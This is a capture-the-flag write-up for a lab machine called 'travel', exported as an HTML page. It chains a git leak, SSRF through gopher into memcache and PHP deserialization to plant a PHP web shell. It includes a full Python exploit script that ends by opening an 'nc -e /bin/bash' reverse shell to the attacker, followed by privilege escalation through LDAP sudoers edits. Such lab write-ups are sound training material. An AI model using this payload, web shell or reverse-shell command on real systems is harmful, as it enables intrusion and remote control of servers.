<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>travel</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">travel</h1><br/><br /><br /><img src="{{site.baseurl}}/assets/images/travel/17-1.png" alt="{{site.baseurl}}/assets/images/travel/17-1.png" /><br /><br />Nmap reported 3 open ports<br /><img src="{{site.baseurl}}/assets/images/travel/17-2.png" alt="{{site.baseurl}}/assets/images/travel/17-2.png" /><br /><br />https reveals there are multiple sub-domains<br /><img src="{{site.baseurl}}/assets/images/travel/17-3.png" alt="{{site.baseurl}}/assets/images/travel/17-3.png" /><br /><br />https leaks sub-domains<br /><img src="{{site.baseurl}}/assets/images/travel/17-4.png" alt="{{site.baseurl}}/assets/images/travel/17-4.png" /><br /><br />http is running wordpress version 5.4<br /><br />blog-dev.travel.htb had a git repo lying around.<br /><br />gobuster found <br /><img src="{{site.baseurl}}/assets/images/travel/17-5.png" alt="{{site.baseurl}}/assets/images/travel/17-5.png" /><br /><br />Dump git repo using git-dumper.py<br /><div class="codebox"><div class="codebox">git-dumper.py&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>blog-dev.travel.htb<span style="color:#ff9d00;font-weight:700">/</span>&nbsp;source<span style="color:#ff9d00;font-weight:700">/</span><br /></div></div><br /><img src="{{site.baseurl}}/assets/images/travel/17-6.png" alt="{{site.baseurl}}/assets/images/travel/17-6.png" /><br /><br /><br />creates a file in wp-content/themes/twentytwenty/logs/<br /><img src="{{site.baseurl}}/assets/images/travel/17-7.png" alt="{{site.baseurl}}/assets/images/travel/17-7.png" /><br /><br />create a serialized object<br /><img src="{{site.baseurl}}/assets/images/travel/17-8.png" alt="{{site.baseurl}}/assets/images/travel/17-8.png" /><br /><br /><img src="{{site.baseurl}}/assets/images/travel/17-9.png" alt="{{site.baseurl}}/assets/images/travel/17-9.png" /><br /><br />This should create a file named pachinko.php, with data &lt;?php system($_GET['cmd']); ?&gt; in it /var/www/html/wp-content/themes/twentytwenty/logs<br /><br /><br /><br />so this checks for a custom_feed_url parameter, if its null, it defaults to http://www.travel.htb/newsfeed/customfeed.xml<br />and then feeds that url to get_feed()<br /><img src="{{site.baseurl}}/assets/images/travel/17-10.png" alt="{{site.baseurl}}/assets/images/travel/17-10.png" /><br /><br />get_feed initializes cache location to memcache<br />sets feed url to the url provided<br />so the data we provide is gonna get stored in memcache<br /><img src="{{site.baseurl}}/assets/images/travel/17-11.png" alt="{{site.baseurl}}/assets/images/travel/17-11.png" /><br /><br />theres a debug.php as well<br /><img src="{{site.baseurl}}/assets/images/travel/17-12.png" alt="{{site.baseurl}}/assets/images/travel/17-12.png" /><br /><br />so if we give it a serialized object, it will get stored there<br />then get <a href="http://blog.travel.htb/awesome-rss">http://blog.travel.htb/awesome-rss</a> to deserialize the object, that will create a file /var/www/html/wp-content/themes/twentytwenty/logs/<br /><br /><br />gopherus.py: <a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a><br />creates a custom gopherus url, with our serialized object to store it in memcache<br /><br /><br /><br /><img src="{{site.baseurl}}/assets/images/travel/17-13.png" alt="{{site.baseurl}}/assets/images/travel/17-13.png" /><br /><br />we nedd to change:<br />1. the key from SpyD3r to something memcache will recognize or is configured to use<br />2. the gopher url cannot point at 127.0.0.1 or localhost, since those keywords are filtered in template.php<br /><br />if you read simplepie documentation, <a href="https://simplepie.org/api/class-SimplePie_Cache_Memcache.html">https://simplepie.org/api/class-SimplePie_Cache_Memcache.html</a><br /><br />memcache://localhost:11211/?timeout=3600&amp;prefix=sp_ siginifies that the timeout is 3600 seconds (1 hr) and all tables in memcached have the sp_ prefix<br />so according to template.php, <br /><img src="{{site.baseurl}}/assets/images/travel/17-14.png" alt="{{site.baseurl}}/assets/images/travel/17-14.png" /><br /><br />we have a timeout of 1min, and a table prefix of xct_<br />but what is the table name ,or should we call it content id<br /><br />if we go to debug.php (http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php)<br /><img src="{{site.baseurl}}/assets/images/travel/17-15.png" alt="{{site.baseurl}}/assets/images/travel/17-15.png" /><br /><br />well its blank at first, but if you go to awesome rss, so it actually stores soemthing in memcache,<br /><img src="{{site.baseurl}}/assets/images/travel/17-16.png" alt="{{site.baseurl}}/assets/images/travel/17-16.png" /><br /><br />that looks like a serialized object?<br />as discussed earlier xct_ is the table prefix. so 4e5612ba07 must be the memcache id or index, idk what else to call it<br />but how is it generated?<br /><br />this from the documentation of simplepie looks somewhat similar<br /><img src="{{site.baseurl}}/assets/images/travel/17-17.png" alt="{{site.baseurl}}/assets/images/travel/17-17.png" /><br /><br />lets assume name is the url<br />so we have md5('url':'type')<br />more googling lead to this: <a href="https://core.trac.wordpress.org/ticket/50159">https://core.trac.wordpress.org/ticket/50159</a><br /><br />md5(md5(filename:extension))<br /><img src="{{site.baseurl}}/assets/images/travel/17-18.png" alt="{{site.baseurl}}/assets/images/travel/17-18.png" /><br /><br />extension is spc for feed cache type<br /><img src="{{site.baseurl}}/assets/images/travel/17-19.png" alt="{{site.baseurl}}/assets/images/travel/17-19.png" /><br /><br /><img src="{{site.baseurl}}/assets/images/travel/17-20.png" alt="{{site.baseurl}}/assets/images/travel/17-20.png" /><br /><br />not md5(filename:type)<br /><img src="{{site.baseurl}}/assets/images/travel/17-21.png" alt="{{site.baseurl}}/assets/images/travel/17-21.png" /><br /><br />not md5(md5(filename:type))<br /><img src="{{site.baseurl}}/assets/images/travel/17-22.png" alt="{{site.baseurl}}/assets/images/travel/17-22.png" /><br /><br />after sometime I finally got it<br /><img src="{{site.baseurl}}/assets/images/travel/17-23.png" alt="{{site.baseurl}}/assets/images/travel/17-23.png" /><br /><br />so the cache index is generated as md5(md5(filename):type)<br /><br /><br />change the gopherus-phpmemcache exploit:<br /><img src="{{site.baseurl}}/assets/images/travel/17-24.png" alt="{{site.baseurl}}/assets/images/travel/17-24.png" /><br /><br />get serialized object<br /><img src="{{site.baseurl}}/assets/images/travel/17-25.png" alt="{{site.baseurl}}/assets/images/travel/17-25.png" /><br /><br /><img src="{{site.baseurl}}/assets/images/travel/17-26.png" alt="{{site.baseurl}}/assets/images/travel/17-26.png" /><br /><br />feed the serialized object to gopherus to get gopher url<br /><img src="{{site.baseurl}}/assets/images/travel/17-27.png" alt="{{site.baseurl}}/assets/images/travel/17-27.png" /><br /><br />get to blog.travel.htb and exploit with this url:<br />blog.travel.htb/awesome-rss/?debug=true&amp;custom_feed_url=gopher://127.00.0.1:11211/_%0d%0aset%20xct_4e5612ba079c530a6b1f148c0b352241%204%200%20106%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:4:%22file%22%3Bs:12:%22pachinko.php%22%3Bs:4:%22data%22%3Bs:30:%22%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a<br /><img src="{{site.baseurl}}/assets/images/travel/17-28.png" alt="{{site.baseurl}}/assets/images/travel/17-28.png" /><br /><br />trigger deserialization by loading content from memcache, by going to blog.travel.htb/awesome-rss<br />and then go to <a href="http://blog.travel.htb/wp-content/themes/twentytwenty/logs/pachinko.php">http://blog.travel.htb/wp-content/themes/twentytwenty/logs/pachinko.php</a><br /><img src="{{site.baseurl}}/assets/images/travel/17-29.png" alt="{{site.baseurl}}/assets/images/travel/17-29.png" /><br /><br />use this code for RCE<br />  <div class="codebox"><div class="codebox"><br />#!/usr/bin/python<br /><br /><span style="color:#ff9d00;font-weight:700">import</span>&nbsp;requests<br /><span style="color:#ff9d00;font-weight:700">import</span>&nbsp;urllib<br /><br />LHOST&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'0.0.0.0'</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#change&nbsp;this<br />LPORT&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'69'</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#change&nbsp;this<br /><span style="color:#ff9d00;font-weight:700">file</span>&nbsp;=&nbsp;"pachinko.php"<br />url&nbsp;=&nbsp;"http:<span style="color:#0088ff;font-weight:400">//blog.travel.htb/"</span><br /><br />#below&nbsp;code&nbsp;<span style="color:#ff9d00;font-weight:700">is</span>&nbsp;modified&nbsp;version&nbsp;<span style="color:#ff9d00;font-weight:700">of</span>&nbsp;gopherus/scripts/PHPMEMCACHE.py&nbsp;==&gt;&nbsp;https:<span style="color:#0088ff;font-weight:400">//github.com/tarunkant/Gopherus</span><br />def&nbsp;payload&nbsp;():<br />&nbsp;&nbsp;&nbsp;&nbsp;code&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">'O:14:"TemplateHelper":2:{s:4:"file";s:'</span>+str(len(<span style="color:#ff9d00;font-weight:700">file</span>))+<span style="color:#3ad900;font-weight:400">':"'</span>+<span style="color:#ff9d00;font-weight:700">file</span>+<span style="color:#3ad900;font-weight:400">'";s:4:"data";s:31:"&lt;?php&nbsp;system($_REQUEST["cmd"]);";}'</span><br />&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;&nbsp;4e5612ba079c530a6b1f148c0b352241&nbsp;<span style="color:#ff9d00;font-weight:700">is</span>&nbsp;md5(md5("http:<span style="color:#0088ff;font-weight:400">//www.travel.htb/newsfeed/customfeed.xml"):"spc")&nbsp;==&gt;&nbsp;&nbsp;echo&nbsp;"http://www.travel.htb/newsfeed/customfeed.xml"|md5sum&nbsp;-&gt;&nbsp;res,&nbsp;echo&nbsp;"res:spc"&nbsp;|md5sum</span><br />&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;=&nbsp;"%0d%0aset&nbsp;xct_4e5612ba079c530a6b1f148c0b352241&nbsp;<span style="color:#ff0044;font-weight:400">4</span>&nbsp;<span style="color:#ff0044;font-weight:400">0</span>&nbsp;"&nbsp;+&nbsp;str(len(code))&nbsp;+&nbsp;"%0d%0a"&nbsp;+&nbsp;&nbsp;code&nbsp;+&nbsp;"%0d%0a"<br />&nbsp;&nbsp;&nbsp;&nbsp;finalpayload&nbsp;=&nbsp;urllib.quote_plus(payload).replace("+","%<span style="color:#ff0044;font-weight:400">20</span>").replace("%2F","/").replace("%<span style="color:#ff0044;font-weight:400">25</span>","%").replace("%3A",":")<br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;"gopher:<span style="color:#0088ff;font-weight:400">//127.00.0.1:11211/_"&nbsp;+&nbsp;finalpayload</span><br /><br /><br />payload&nbsp;=&nbsp;payload()<br />print&nbsp;"[*]&nbsp;PAYLOAD:&nbsp;"+payload<br /><br />#SSRF<br />print&nbsp;"[*]&nbsp;Trying&nbsp;SSRF&nbsp;<span style="color:#ff9d00;font-weight:700">to</span>&nbsp;store&nbsp;serialized&nbsp;<span style="color:#ff9d00;font-weight:700">object</span>&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;memcached...."<br />SSRFURL&nbsp;=&nbsp;url+"awesome-rss/?debug=yes&amp;custom_feed_url="+payload<br />SSRF_response&nbsp;=&nbsp;requests.get(SSRFURL)<br />print(SSRF_response.status_code)<br /><br />#php-deserialization<br />print&nbsp;"[*]&nbsp;Triggering&nbsp;deserilzation...."<br />DES_response&nbsp;=&nbsp;requests.get(url+"awesome-rss/")<br />print(DES_response.status_code)<br /><br />#check&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;web&nbsp;shell<br />print&nbsp;"[*]&nbsp;Checking&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;webshell&nbsp;exists...."<br />WEBSHELL&nbsp;=&nbsp;url&nbsp;+&nbsp;"wp-content/themes/twentytwenty/logs/"+<span style="color:#ff9d00;font-weight:700">file</span><br /><span style="color:#ff9d00;font-weight:700">while</span>&nbsp;<span style="color:#ff9d00;font-weight:700">True</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;WEBSHELL&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;shell_response&nbsp;=&nbsp;requests.get(WEBSHELL)<br />&nbsp;&nbsp;&nbsp;&nbsp;print(shell_response.status_code)<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;shell_response.status_code&nbsp;==&nbsp;<span style="color:#ff0044;font-weight:400">200</span>:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;"[+]&nbsp;Webshell&nbsp;created!"<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">break</span>;<br /><br />#spawn&nbsp;shell&nbsp;on&nbsp;nc<br />print("[*]&nbsp;Spawning&nbsp;shell,&nbsp;make&nbsp;sure&nbsp;your&nbsp;listener&nbsp;<span style="color:#ff9d00;font-weight:700">is</span>&nbsp;running&nbsp;on&nbsp;port&nbsp;<span style="color:#ff0044;font-weight:400">9001</span>")<br />requests.get(WEBSHELL+"?cmd=nc&nbsp;-e&nbsp;/bin/bash&nbsp;"+LHOST+"&nbsp;"+LPORT)<br /><br /></div></div><br />  <br />  <br />exists, but is of no use<br /><img src="{{site.baseurl}}/assets/images/travel/17-30.png" alt="{{site.baseurl}}/assets/images/travel/17-30.png" /><br /><br />sql backup<br /><img src="{{site.baseurl}}/assets/images/travel/17-31.png" alt="{{site.baseurl}}/assets/images/travel/17-31.png" /><br /><br />hashed password insql backup<br /><img src="{{site.baseurl}}/assets/images/travel/17-32.png" alt="{{site.baseurl}}/assets/images/travel/17-32.png" /><br /><br />crack with hashcat<br />only one hash cracks for user lynik-admin<br /><img src="{{site.baseurl}}/assets/images/travel/17-33.png" alt="{{site.baseurl}}/assets/images/travel/17-33.png" /><br /><br />ssh in as lynik-admin<br /><br />ldap is installed<br />lynik is ldap admin. we can modify any user present in AD, add them to sudoers group<br /><img src="{{site.baseurl}}/assets/images/travel/17-34.png" alt="{{site.baseurl}}/assets/images/travel/17-34.png" /><br /><br />found bindpw in .viminfo<br /><img src="{{site.baseurl}}/assets/images/travel/17-35.png" alt="{{site.baseurl}}/assets/images/travel/17-35.png" /><br /><br />create user.ldif and modify their properties:<br /><img src="{{site.baseurl}}/assets/images/travel/17-36.png" alt="{{site.baseurl}}/assets/images/travel/17-36.png" /><br /><br />transfer the file over to the server, and modify ldap entry<br /><img src="{{site.baseurl}}/assets/images/travel/17-37.png" alt="{{site.baseurl}}/assets/images/travel/17-37.png" /><br /><br />ssh in as the user, verify they are in sudoers group<br /><img src="{{site.baseurl}}/assets/images/travel/17-38.png" alt="{{site.baseurl}}/assets/images/travel/17-38.png" /><br /><br />spawn root shell<br /><img src="{{site.baseurl}}/assets/images/travel/17-39.png" alt="{{site.baseurl}}/assets/images/travel/17-39.png" /><br /></div></body></html>
